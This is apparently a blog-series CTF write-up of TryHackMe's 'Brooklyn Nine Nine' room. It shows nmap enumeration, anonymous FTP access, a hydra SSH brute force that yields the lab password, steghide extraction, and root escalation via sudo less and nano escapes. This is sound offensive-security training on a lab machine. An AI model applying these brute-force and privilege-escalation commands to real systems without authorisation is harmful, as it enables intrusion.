# Day 042 - CTF Writeup: TryHackMe Room

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Different platforms develop different skills.

HackTheBox (Day 41) is more realistic - minimal guidance, figure it out yourself.

TryHackMe is more structured - guided rooms, step-by-step tasks, great for learning specific techniques.

Today: a full writeup of TryHackMe's **"Brooklyn Nine Nine"** room - a beginner-friendly machine that teaches enumeration, FTP anonymous access, steganography, and Linux privilege escalation.

---

## 🎯 Room: Brooklyn Nine Nine

```
Platform:   TryHackMe
Difficulty: Easy
OS:         Linux
URL:        https://tryhackme.com/room/brooklynninenine
```

---

## Phase 1 - Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -T4 <TARGET_IP> -oN nmap_scan.txt
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

**Key finding:** Anonymous FTP login allowed. There's a file: `note_to_jake.txt`.

### FTP Anonymous Login

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: (blank)

ftp> ls
# -rw-r--r-- note_to_jake.txt

ftp> get note_to_jake.txt
ftp> exit

cat note_to_jake.txt
```

**Contents:**
```
From Amy,

Jake please change your password. It is too weak and 
everyone is giving you a hard time about it!
```

**Intel gathered:**
- Username: `jake`
- Password is weak - brute force candidate

### Web Enumeration

```bash
# Visit the website
curl http://<TARGET_IP>
# Brooklyn Nine Nine themed page with an image

# Download the background image
wget http://<TARGET_IP>/brooklyn99.jpg

# Directory scan
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirb/common.txt
# No interesting directories found
```

---

## Phase 2 - Exploitation Path A: SSH Brute Force

```bash
# Brute force jake's SSH password (we know it's weak)
hydra -l jake -P /usr/share/wordlists/rockyou.txt \
  ssh://<TARGET_IP> -t 4

# Result (after ~2 minutes):
# [22][ssh] login: jake password: 987654321
```

```bash
# Login
ssh jake@<TARGET_IP>
# Password: 987654321

whoami
# jake
```

---

## Phase 3 - Privilege Escalation

```bash
# First check: sudo privileges
sudo -l
# (ALL) NOPASSWD: /usr/bin/less

# GTFOBins - less with sudo
sudo less /etc/passwd
# Inside less: !/bin/bash

# Result:
whoami
# root

# Get flags
cat /home/holt/user.txt
cat /root/root.txt
```

Both flags captured.

---

## Phase 4 - Hidden Path: Steganography

The image downloaded from the web server hides a secret.

```bash
# Check image for hidden data
steghide info brooklyn99.jpg
# Enter passphrase: (try blank first)
# embedded file: note.txt

steghide extract -sf brooklyn99.jpg
# Enter passphrase: (blank)
# wrote extracted data to "note.txt"

cat note.txt
# Holt's password is: [password]
```

```bash
# Alternative root path via Holt's account
ssh holt@<TARGET_IP>
# Password: [from steghide]

sudo -l
# (root) NOPASSWD: /bin/nano

# GTFOBins - nano with sudo
sudo nano /etc/passwd
# Ctrl+R Ctrl+X
# reset; bash 1>&0 2>&0

whoami
# root
```

Two completely different paths to root from the same machine.

---

## 🗺️ Attack Chain

```
Nmap → Anonymous FTP → note_to_jake.txt → username: jake
         ↓
Hydra brute force SSH → jake:987654321
         ↓
sudo -l → /usr/bin/less → GTFOBins → root
         ↓
user.txt + root.txt

Alternate path:
Web image → steghide → holt's password
         ↓
SSH as holt → sudo nano → GTFOBins → root
```

---

## 📖 Lessons Learned

1. **Anonymous FTP is always worth checking** - it yielded immediate intel (username + password hint)

2. **Steganography appears in CTFs regularly** - `steghide`, `stegseek`, `binwalk`, `strings` are all worth knowing

3. **GTFOBins is essential** - `less` and `nano` both have sudo escalation paths most people wouldn't think of

4. **Multiple paths exist on well-designed machines** - exploring both teaches more than stopping at the first root

5. **Information from notes counts as credentials** - "password is weak" + username = targeted brute force

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| ftp | Anonymous FTP access |
| gobuster | Directory enumeration |
| hydra | SSH brute force |
| steghide | Image steganography extraction |
| GTFOBins | Privilege escalation reference |

---

## 🔑 Key Takeaways

- Anonymous FTP - always test this (Day 23 content applied directly)
- Steganography hides data in images, audio, video - common in CTFs
- Two sudo entries, two root paths - machines often have multiple solutions
- `steghide` with no passphrase works more often than you'd expect
- Every piece of information gathered has potential intelligence value

---

## 📚 Resources
- [TryHackMe - Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)
- [GTFOBins](https://gtfobins.github.io/)
- [Steghide documentation](http://steghide.sourceforge.net/documentation.php)

---

## [⬅️ Day 041](../day041/) | [➡️ Day 043](../day043/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*